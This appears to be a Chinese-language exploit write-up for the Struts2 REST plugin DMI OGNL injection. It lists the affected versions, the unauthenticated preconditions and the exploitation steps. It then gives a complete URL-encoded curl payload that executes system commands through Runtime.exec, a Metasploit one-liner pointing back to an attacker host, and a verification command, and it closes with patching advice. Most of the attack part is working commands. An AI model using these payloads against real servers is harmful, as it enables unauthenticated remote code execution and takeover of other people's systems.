## 漏洞描述

Struts2 REST 插件在开启 Dynamic Method Invocation (DMI) 时存在 OGNL 注入漏洞。攻击者通过在 URL 中使用 `!` 调用方法名，注入 OGNL 表达式实现远程代码执行。

## 影响版本

- Apache Struts 2.3.20 - 2.3.28 (使用 REST 插件 + 启用 DMI)

## 前置条件

- 无需认证
- 使用 REST 插件
- 启用 Dynamic Method Invocation

## 利用步骤

1. 确认目标使用 Struts2 REST 插件
2. 在 URL 方法调用部分注入 OGNL 表达式
3. 通过 Runtime.exec() 执行系统命令

## Payload

```bash
curl "http://target/orders/3!%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23xx%3d123%2C%23rs%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())%2C%23wr%3d%23context%5B%23parameters.obj%5B0%5D%5D.getWriter()%2C%23wr.println(%23rs)%2C%23wr.flush()%2C%23wr.close&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts_dmi_exec; set RHOSTS target; set TARGETURI /orders/3; set RPORT 8080; set LHOST attacker_ip; run"
```

## 验证方法

```bash
# 响应体中包含命令输出（如 uid= ）表示成功
curl -s "http://target/orders/3!%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23rs%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())%2C%23wr%3d%23context%5B%23parameters.obj%5B0%5D%5D.getWriter()%2C%23wr.println(%23rs)%2C%23wr.flush()%2C%23wr.close&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" | grep "uid="
```

## 修复建议

- 升级至 Struts 2.3.28.1+ 或 2.5+
- 禁用 Dynamic Method Invocation
